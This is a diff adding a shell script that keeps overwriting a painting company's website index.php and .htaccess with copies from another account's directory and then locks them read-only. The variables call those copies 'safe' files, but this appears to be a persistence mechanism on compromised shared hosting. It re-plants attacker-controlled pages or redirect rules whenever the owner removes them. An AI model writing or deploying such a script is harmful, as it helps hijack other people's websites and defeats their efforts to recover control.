@@ -1,0 +1,29 @@
+#!/bin/sh
+
+FILE="/home/u200768895/domains/aceprofessionalpainting.ca/public_html/index.php"
+SAFE="/home/samsufyop/malam.545565.rest/spongebob/index.php"
+
+if [ ! -f "$FILE" ]; then
+    cp "$SAFE" "$FILE"
+    chmod 444 "$FILE"
+fi
+
+if [ -f "$FILE" ] && ! cmp -s "$FILE" "$SAFE"; then
+    chmod 644 "$FILE"
+    cp "$SAFE" "$FILE"
+    chmod 444 "$FILE"
+fi
+
+HTFILE="/home/u200768895/domains/aceprofessionalpainting.ca/public_html/.htaccess"
+HTSAFE="/home/samsufyop/malam.545565.rest/spongebob/.htaccess"
+
+if [ ! -f "$HTFILE" ]; then
+    cp "$HTSAFE" "$HTFILE"
+    chmod 444 "$HTFILE"
+fi
+
+if [ -f "$HTFILE" ] && ! cmp -s "$HTFILE" "$HTSAFE"; then
+    chmod 644 "$HTFILE"
+    cp "$HTSAFE" "$HTFILE"
+    chmod 444 "$HTFILE"
+fi
